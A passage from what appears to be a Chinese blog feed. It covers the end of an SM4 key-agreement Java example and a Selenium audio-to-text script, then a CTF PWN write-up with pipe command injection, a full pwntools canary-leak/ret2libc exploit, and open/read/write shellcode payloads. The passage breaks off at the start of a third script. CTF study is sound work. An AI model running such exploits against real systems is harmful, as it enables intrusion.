<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> socket.getInputStream();</span><br><span class="line"><span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line"><span class="type">int</span> len;</span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">enmessage</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">inputStream.toString();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((len = inputStream.read(bytes)) != -<span class="number">1</span>) {</span><br><span class="line">    <span class="comment">//只有当客户端关闭它的输出流的时候，服务端才能取得结尾的-1</span></span><br><span class="line">	enmessage.append(<span class="keyword">new</span> <span class="title class_">String</span>(bytes, <span class="number">0</span>, len, <span class="string">"UTF-8"</span>));</span><br><span class="line">} </span><br><span class="line">System.out.println(<span class="string">"get enmessage from client: "</span> + enmessage);</span><br><span class="line"><span class="type">SM4Utils</span> <span class="variable">sm4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SM4Utils</span>();</span><br><span class="line">sm4.setSecretKey(sharedkey.toString());</span><br><span class="line">sm4.setHexString(<span class="literal">false</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">plainText</span> <span class="operator">=</span> sm4.decryptData_ECB(enmessage.toString());</span><br><span class="line">System.out.println(<span class="string">"the messsge is: "</span> + plainText);</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="程序运行结果"><a href="#程序运行结果" class="headerlink" title="程序运行结果"></a>程序运行结果</h3><p>client(User A)运行结果：</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200517001829.png"></p>
<p>server(User B)运行结果：</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200517001855.png"></p>
<h3 id="附程序源代码"><a href="#附程序源代码" class="headerlink" title="附程序源代码"></a>附程序源代码</h3><p><a href="https://github.com/Leeyuxun/Key-Agreement-Protocol-SM2-SM3-SM4">程序源代码下载</a></p>
]]></content>
      <categories>
        <category>personal tools</category>
      </categories>
      <tags>
        <tag>SM2</tag>
        <tag>SM3</tag>
        <tag>密钥协商协议</tag>
        <tag>SM4</tag>
      </tags>
  </entry>
  <entry>
    <title>大量短音频免费快速转文字</title>
    <url>/%E5%A4%A7%E9%87%8F%E7%9F%AD%E9%9F%B3%E9%A2%91%E5%85%8D%E8%B4%B9%E5%BF%AB%E9%80%9F%E8%BD%AC%E6%96%87%E5%AD%97.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近做起工具人，对大量音频进行文字标注。工作太枯燥，费时，就写了一个脚本，借助迅捷音频转文字在线工具，个人感觉在一定程度上提高了效率<span id="more"></span></p>
<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>很简单</p>
<ol>
<li>将大量短音频合并，中间用特殊的音频分隔</li>
<li>将大的音频分隔成固定大小的音频（迅捷在线语音转换一次最多只能免费转换20M的音频）</li>
<li>上传到迅捷音频转换页面，进行转换，并把txt文件下载</li>
<li>整理txt文件，删除标点和间隔语音转换的文字，并把所有文字合并到同一个txt文件里面</li>
</ol>
<h1 id="语言"><a href="#语言" class="headerlink" title="语言"></a>语言</h1><p>python 3.7</p>
<h1 id="引用库"><a href="#引用库" class="headerlink" title="引用库"></a>引用库</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">from</span> pydub <span class="keyword">import</span> AudioSegment</span><br><span class="line"><span class="keyword">from</span> pydub.utils <span class="keyword">import</span> make_chunks</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br></pre></td></tr></table></figure>

<p>具体原理相关库已经说明，可以使用pip直接下载，也可以手动下载安装，遇到问题直接Google求助，这里不再说明</p>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p>脚本1，将音频合并切割并转换成txt</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">from</span> pydub <span class="keyword">import</span> AudioSegment</span><br><span class="line"><span class="keyword">from</span> pydub.utils <span class="keyword">import</span> make_chunks</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">dir_parent = <span class="string">&#x27;D:\\测试音频&#x27;</span>		<span class="comment">#音频存放位置</span></span><br><span class="line">dir_letter = dir_parent + <span class="string">&#x27;\\合并后的音频&#x27;</span>	<span class="comment">#合并后的音频存放的位置</span></span><br><span class="line">dir_letter_letter = dir_parent + <span class="string">&#x27;\\切割后的音频&#x27;</span>	<span class="comment">#切割后的音频存放的位置</span></span><br><span class="line">dir_letter_txt = dir_parent + <span class="string">&#x27;\\转换后的txt文件&#x27;</span>	<span class="comment">#下载转换后的txt文件存放的位置</span></span><br><span class="line">add_sound = AudioSegment.from_wav(<span class="string">&#x27;sample.wav&#x27;</span>)		<span class="comment">#sample.wav是间隔音频，和脚本放在同一目录</span></span><br><span class="line">sum_sound = add_sound</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分别和并同一文件夹下的所有音频</span></span><br><span class="line"><span class="keyword">for</span> path,dir_list,file_list <span class="keyword">in</span> os.walk(dir_parent):</span><br><span class="line">    <span class="keyword">for</span> dir_name <span class="keyword">in</span> dir_list:</span><br><span class="line">        dir_child = dir_parent + <span class="string">&#x27;\\&#x27;</span> + dir_name</span><br><span class="line">        <span class="keyword">for</span> path,dir_list,file_list <span class="keyword">in</span> os.walk(dir_child):</span><br><span class="line">            <span class="keyword">for</span> file_name <span class="keyword">in</span> file_list:</span><br><span class="line">                <span class="comment">#print(file_name)</span></span><br><span class="line">                front_path = os.path.join(path, file_name)</span><br><span class="line">                <span class="comment">#print(front_path)</span></span><br><span class="line">                front_sound = AudioSegment.from_wav(front_path)</span><br><span class="line">                sum_sound = sum_sound + front_sound + add_sound</span><br><span class="line">        sum_sound.export(dir_child+<span class="string">&#x27;已合并.wav&#x27;</span>,<span class="built_in">format</span>=<span class="string">&quot;wav&quot;</span>)</span><br><span class="line">        sum_sound = add_sound</span><br><span class="line">        <span class="built_in">print</span>(dir_child+<span class="string">&#x27;文件下的音频合并完成&#x27;</span>)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># 将处理过的音频放入同一文件夹内</span></span><br><span class="line">os.makedirs(dir_letter)</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(dir_parent):</span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(dir_parent + <span class="string">&#x27;\\&#x27;</span> + file):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;已合并&#x27;</span> <span class="keyword">in</span> file:</span><br><span class="line">            shutil.move(dir_parent + <span class="string">&#x27;\\&#x27;</span> + file,dir_letter)   </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;所有音频合并完成&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 切割合并后的音频</span></span><br><span class="line">chunk_length_ms = <span class="number">325000</span> <span class="comment"># 分块的毫秒数（测试wav文件每个音频如果在325s内刚好不多于20M,当然也可以改成300s）</span></span><br><span class="line">os.makedirs(dir_letter_letter)  <span class="comment"># 创建切割音频的文件夹</span></span><br><span class="line"><span class="keyword">for</span> path,dir_list,file_list <span class="keyword">in</span> os.walk(dir_letter):</span><br><span class="line">    <span class="keyword">for</span> file_name <span class="keyword">in</span> file_list:</span><br><span class="line">        audio = AudioSegment.from_file(dir_letter+<span class="string">&#x27;\\&#x27;</span>+file_name , <span class="string">&quot;wav&quot;</span>) </span><br><span class="line">        chunks = make_chunks(audio, chunk_length_ms) <span class="comment">#将音频切割</span></span><br><span class="line">        <span class="comment">#保存切割的音频到文件</span></span><br><span class="line">        <span class="comment"># 下面两行目的是对文件名进行简单处理，保证文件名都是数字，排序时方便整理，这个因文件名而异</span></span><br><span class="line">        file_name_change1 = file_name.strip(<span class="string">&#x27;已合并.wav&#x27;</span>)</span><br><span class="line">        file_name_change2 = file_name_change1.strip(<span class="string">&#x27;AAAAA&#x27;</span>)	<span class="comment">#AAAAA是file_name的前缀</span></span><br><span class="line">        <span class="keyword">for</span> i, chunk <span class="keyword">in</span> <span class="built_in">enumerate</span>(chunks):</span><br><span class="line">            chunk_name = dir_letter_letter+<span class="string">&quot;\\&quot;</span>+file_name_change2+<span class="string">&quot;&#123;0&#125;.wav&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">            chunk.export(chunk_name, <span class="built_in">format</span>=<span class="string">&quot;wav&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;音频&quot;</span>+file_name_change2+<span class="string">&quot;切割完成&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;所有音频切割完成&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换音频文件</span></span><br><span class="line"><span class="comment"># 更改firefox默认下载设置，不懂可自行Google</span></span><br><span class="line">profile = webdriver.FirefoxProfile()</span><br><span class="line">profile.set_preference(<span class="string">&#x27;browser.download.dir&#x27;</span>,dir_letter_letter)</span><br><span class="line">profile.set_preference(<span class="string">&#x27;browser.download.folderList&#x27;</span>,<span class="number">2</span>)</span><br><span class="line">profile.set_preference(<span class="string">&#x27;browser.download.manager.showWhenStarting&#x27;</span>,<span class="literal">False</span>)</span><br><span class="line">profile.set_preference(<span class="string">&#x27;browser.helperApps.neverAsk.saveToDisk&#x27;</span>,<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 历遍文件夹内的文件并返回一个列表</span></span><br><span class="line">path_list = os.listdir(dir_letter_letter)</span><br><span class="line"><span class="comment"># 利用循环历遍path_list列表</span></span><br><span class="line"><span class="keyword">for</span> file_name <span class="keyword">in</span> path_list:</span><br><span class="line">    <span class="comment">#print(filename)</span></span><br><span class="line">    <span class="comment">#启动浏览器</span></span><br><span class="line">    driver1 = webdriver.Firefox(firefox_profile=profile)</span><br><span class="line">    driver1.get(<span class="string">&quot;https://app.xunjiepdf.com/voice2text/&quot;</span>)	<span class="comment">#打开迅捷转换网页</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;开始上传&#x27;</span>+file_name+<span class="string">&#x27;音频文件&#x27;</span>)</span><br><span class="line">    upload = driver1.find_element_by_name(<span class="string">&#x27;file&#x27;</span>)	<span class="comment">#寻找上传按钮</span></span><br><span class="line">    upload.send_keys(dir_letter_letter+<span class="string">&#x27;\\&#x27;</span>+file_name)  <span class="comment">#上传文件</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;音频文件&#x27;</span>+file_name+<span class="string">&#x27;上传成功&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">50</span>)	<span class="comment">#睡眠50S等待音频转换完成</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;开始下载文件&#x27;</span>)</span><br><span class="line">    driver1.execute_script(<span class="string">&quot;arguments[0].click();&quot;</span>, driver1.find_element_by_xpath(<span class="string">&quot;//a[contains(text(),&#x27;立即下载&#x27;)]&quot;</span>))	<span class="comment">#定位txt下载按钮并下载</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;文件下载成功&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;所有文件下载完成&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>脚本2，整理txt</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">from</span> pydub <span class="keyword">import</span> AudioSegment</span><br><span class="line"><span class="keyword">from</span> pydub.utils <span class="keyword">import</span> make_chunks</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">dir_parent = <span class="string">&#x27;D:\\测试音频&#x27;</span>		<span class="comment">#音频存放位置</span></span><br><span class="line">dir_letter = dir_parent + <span class="string">&#x27;\\合并后的音频&#x27;</span>	<span class="comment">#合并后的音频存放的位置</span></span><br><span class="line">dir_letter_letter = dir_parent + <span class="string">&#x27;\\切割后的音频&#x27;</span>	<span class="comment">#切割后的音频存放的位置</span></span><br><span class="line">dir_letter_txt = dir_parent + <span class="string">&#x27;\\转换后的txt文件&#x27;</span>	<span class="comment">#下载转换后的txt文件存放的位置</span></span><br><span class="line">add_sound = AudioSegment.from_wav(<span class="string">&#x27;sample.wav&#x27;</span>)		<span class="comment">#sample.wav是间隔音频，和脚本放在同一目录</span></span><br><span class="line">sum_sound = add_sound</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将所有txt文件合并</span></span><br><span class="line"><span class="keyword">for</span> file_name <span class="keyword">in</span> os.listdir(dir_letter_txt):</span><br><span class="line">    <span class="built_in">print</span>(file_name)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(dir_letter_txt+<span class="string">&#x27;\\&#x27;</span>+file_name,encoding=<span class="string">&#x27;UTF-8&#x27;</span>):</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;result.txt&quot;</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment"># result.txt是创建的和脚本位于同一目录下的存放所有转换文字的文件</span></span><br><span class="line">        f.write(line)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 整理了txt文件内容</span></span><br><span class="line"><span class="comment"># 将文件中的句号转换成空格</span></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">alllines=f.readlines()</span><br><span class="line">f.close()</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;w+&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> eachline <span class="keyword">in</span> alllines:</span><br><span class="line">    a=re.sub(<span class="string">&#x27;。&#x27;</span>,<span class="string">&#x27; &#x27;</span>,eachline)</span><br><span class="line">    f.writelines(a)</span><br><span class="line">f.close()</span><br><span class="line"><span class="comment"># 将文件中的逗号转换成空格</span></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">alllines=f.readlines()</span><br><span class="line">f.close()</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;w+&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> eachline <span class="keyword">in</span> alllines:</span><br><span class="line">    a=re.sub(<span class="string">&#x27;，&#x27;</span>,<span class="string">&#x27; &#x27;</span>,eachline)</span><br><span class="line">    f.writelines(a)</span><br><span class="line">f.close()</span><br><span class="line"><span class="comment"># 将文件中的顿号转换成空格</span></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">alllines=f.readlines()</span><br><span class="line">f.close()</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;w+&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> eachline <span class="keyword">in</span> alllines:</span><br><span class="line">    a=re.sub(<span class="string">&#x27;、&#x27;</span>,<span class="string">&#x27;&#x27;</span>,eachline)</span><br><span class="line">    f.writelines(a)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将间隔音频转换的文字转换成换行符，方便查看</span></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)	</span><br><span class="line">alllines=f.readlines()</span><br><span class="line">f.close()</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;w+&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> eachline <span class="keyword">in</span> alllines:</span><br><span class="line">    a=re.sub(<span class="string">&#x27;AAAA&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,eachline)		<span class="comment">#AAAA是间隔音频转换的文字内容</span></span><br><span class="line">    f.writelines(a)</span><br><span class="line">f.close()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;txt处理完成，请查看result.txt文件&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>脚本写的比较匆忙，自己对python也不是很熟悉，没有使用函数，凑活用，直接是个单线程的程序，尝试处理八百多条音频时间二十分钟左右，识别率挺高，没有用多线程是因为脚本运行过程中多次调用firefox，担心程序崩溃。</p>
<h1 id="附"><a href="#附" class="headerlink" title="附"></a>附</h1><p>脚本文件已上传到<a href="https://github.com/Leeyuxun/Audio-to-text">github</a>，可自行下载；</p>
<p>脚本成功运行的条件是音频放在多个文件夹里面，多个文件夹同时有放在同一个名为“测试音频”的文件夹里面，相当于是三级目录。</p>
]]></content>
      <categories>
        <category>personal tools</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>音频转文字</tag>
      </tags>
  </entry>
  <entry>
    <title>弱口令安全实验室招新赛PWN-WriteUp</title>
    <url>/%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9BPWN-WriteUp.html</url>
    <content><![CDATA[<h2 id="Game"><a href="#Game" class="headerlink" title="Game"></a>Game</h2><span id="more"></span>

<ol>
<li><p>IDA分析发现需要满足输入的v3==v4，v4是一个srand()确定的随机数，才能跳转到back函数，在back函数里面利用Linux管道符可执行命令。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127191416.png"></p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127191445.png" style="zoom:75%;"></li>
<li><p>GDB查看v4的值为0x18c55c46（415587398）</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127191536.png"></p>
</li>
<li><p>nc远程连接后输入415587398，然后输入任意IP｜指令，即可执行系统命令，获取flag。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127191559.png"></p>
</li>
</ol>
<h2 id="stackoverflow"><a href="#stackoverflow" class="headerlink" title="stackoverflow"></a>stackoverflow</h2><ol>
<li><p>checksec发现开启了Canary和NX</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127191622.png"></p>
</li>
<li><p>IDA分析发现func中buf和v2两个变量均存在栈溢出。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127192338.png"></p>
</li>
<li><p>未发现system函数，提供了glibc，需要ret2libc题目。</p>
</li>
<li><p>由于开启了Canary，首先需要第一次输入泄漏Canary，其次需要获取libc基址和binsh的位置。</p>
</li>
<li><p>已知func_addr = 0x40128a、popedi_addr = 0x401393、func_ret_addr = 0x4012ff，首先计算libc基地，可通过<code>payload2 = 'A'*(0x40-8) + p64(canary_addr) + p64(0x00) + p64(popedi_addr) + p64(puts_got) + p64(puts_plt) +  p64(func_addr)</code>泄漏puts函数的真实地址，计算libc基址、sys真实地址和binsh真实地址。最后通过<code>payload3 = 'A'*(0x40-8) + p64(canary_addr) + b'bbbbbbbb' + p64(func_ret_addr) + p64(popedi_addr) + p64(binsh_addr) + p64(system_addr)</code>执行<code>system(/bin/sh)</code>。</p>
</li>
<li><p>利用脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------- parm zone -------------------------------------------------------#</span></span><br><span class="line">context.terminal    =   [<span class="string">'/usr/bin/tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">context.log_level   =   <span class="string">'debug'</span></span><br><span class="line">context.os          =   <span class="string">'linux'</span></span><br><span class="line">context.arch        =   <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------- functions for quick script --------------------------------------#</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)  <span class="comment"># in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :sh.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :sh.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :sh.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :sh.recvuntil(delims, drop)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :sh.recvuntil(<span class="string">b'\n'</span>).strip(<span class="string">b'\n'</span>)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :sh.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :sh.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :sh.debug(gdbscript=gs, **kwargs)</span><br><span class="line">rm      = <span class="keyword">lambda</span>                    :io.recvuntil(rmflag)</span><br><span class="line">og      = <span class="keyword">lambda</span> path=null          :<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,subprocess.check_output([<span class="string">'one_gadget'</span>,<span class="string">'--raw'</span>,<span class="string">'-f'</span>,libc.path]).decode().strip(<span class="string">'\n'</span>).split(<span class="string">' '</span>))) <span class="keyword">if</span> path == null <span class="keyword">else</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,subprocess.check_output([<span class="string">'one_gadget'</span>,<span class="string">'--raw'</span>,<span class="string">'-f'</span>,path]).decode().strip(<span class="string">'\n'</span>).split(<span class="string">' '</span>)))</span><br><span class="line">clear   = <span class="keyword">lambda</span>                    :os.system(<span class="string">'clear'</span>)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">'\x1b[01;38;5;214m{} = {:#x}\x1b[0m'</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">li      = <span class="keyword">lambda</span> x                  :log.info(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------- func zone -------------------------------------------------------#</span></span><br><span class="line"><span class="comment"># gdb attach</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gdb</span>(<span class="params">cmd=<span class="string">""</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        gdb.attach(sh,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># remote or local </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proloc</span>(<span class="params">elf_addr,libc_addr,pro_libc</span>):</span><br><span class="line">    <span class="keyword">global</span> sh, elf, libc, one_ggs</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> :</span><br><span class="line">        ip      =   sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)[<span class="number">0</span>]</span><br><span class="line">        prot    =   sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)[<span class="number">0</span>]</span><br><span class="line">        sh      =   remote(ip,prot)</span><br><span class="line">        libc    =   pro_libc</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sh      =   process(elf_addr) </span><br><span class="line">        elf     =   ELF(elf_addr)</span><br><span class="line">        libc    =   elf.libc    <span class="comment"># libc    =   ELF(libc_addr, checksec=False)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------- code zone -------------------------------------------------------#</span></span><br><span class="line"><span class="comment"># Leak Canary &amp; ret2libc</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># leak canary</span></span><br><span class="line">    sla(<span class="string">'Do you know who first discovered the stack overflow'</span>,<span class="string">b'A'</span>*(<span class="number">0x60</span>-<span class="number">8</span>))</span><br><span class="line">    ru(<span class="string">b'A'</span>*(<span class="number">0x60</span>-<span class="number">8</span>) + <span class="string">b'\n'</span>)</span><br><span class="line">    canary=uu64(r(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">    leak(<span class="string">'canary'</span>,canary)</span><br><span class="line">    <span class="comment"># leak libc_base</span></span><br><span class="line">    puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">    puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">    func_addr = <span class="number">0x40128a</span></span><br><span class="line">    popedi_addr = <span class="number">0x401393</span></span><br><span class="line">    func_ret_addr = <span class="number">0x4012ff</span></span><br><span class="line">    payload = flat(<span class="string">b'A'</span>*(<span class="number">0x40</span>-<span class="number">8</span>), p64(canary), p64(<span class="number">0x00</span>), p64(popedi_addr), p64(puts_got), p64(puts_plt), p64(func_addr))</span><br><span class="line">    sla(<span class="string">'leave your name:'</span>,payload)</span><br><span class="line">    puts_addr = u64(sh.recvuntil(<span class="string">"\n"</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b"/bin/sh"</span>))</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    leak(<span class="string">'libc_base'</span>,libc_base)</span><br><span class="line">    <span class="comment"># ret2libc getshell</span></span><br><span class="line">    sl(<span class="string">b'A'</span>*(<span class="number">0x60</span>-<span class="number">8</span>))</span><br><span class="line">    ru(<span class="string">b'A'</span>*(<span class="number">0x60</span>-<span class="number">8</span>) + <span class="string">b'\n'</span>)</span><br><span class="line">    canary = uu64(r(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">    leak(<span class="string">'canary'</span>,canary)</span><br><span class="line">    payload = flat(<span class="string">b'A'</span>*(<span class="number">0x40</span>-<span class="number">8</span>), p64(canary), p64(<span class="number">0x00</span>), p64(func_ret_addr), p64(popedi_addr), p64(binsh_addr), p64(system_addr), p64(func_addr))</span><br><span class="line">    sla(<span class="string">'leave your name:'</span>,payload)</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    elf_addr    =   <span class="string">'./stackoverflow'</span>                   <span class="comment"># local ELF</span></span><br><span class="line">    libc_addr   =   <span class="string">'libc.so.6'</span>                         <span class="comment"># local Libc</span></span><br><span class="line">    pro_libc    =   <span class="string">""</span>                                  <span class="comment"># remote Libc</span></span><br><span class="line">    proloc(elf_addr, libc_addr, pro_libc)</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="ssssssn"><a href="#ssssssn" class="headerlink" title="ssssssn"></a>ssssssn</h2><ol>
<li><p>checksec，保护全开</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127191822.png"></p>
</li>
<li><p>开启了沙箱，不允许执行命令。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127191842.png"></p>
</li>
<li><p>IDA分析发现是利用mmap函数建立了一个权限为7的内存映射，然后利用read函数读入13字节去执行。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127191906.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127191921.png"></p>
</li>
<li><p>由于只允许输入13个字节，因此先利用payload1<code>asm('mov rdx, 0x100')+asm('xor rax, rax')+asm('syscall')</code>扩大从标准输入读取长度，然后进行ORW，payload：<code>b'\x90'*len(payload1) + asm(shellcraft.open("flag")) + asm(shellcraft.read("rax", "rsp", 0x100)) + asm(shellcraft.write(1, "rsp", 0x100))</code>，打开flag文件，rax接收返回的文件描述符，根据rax的文件描述符读取flag写入rsp指向的内存，然后从rsp将flag写入到标准输出。</p>
</li>
<li><p>利用脚本</p>
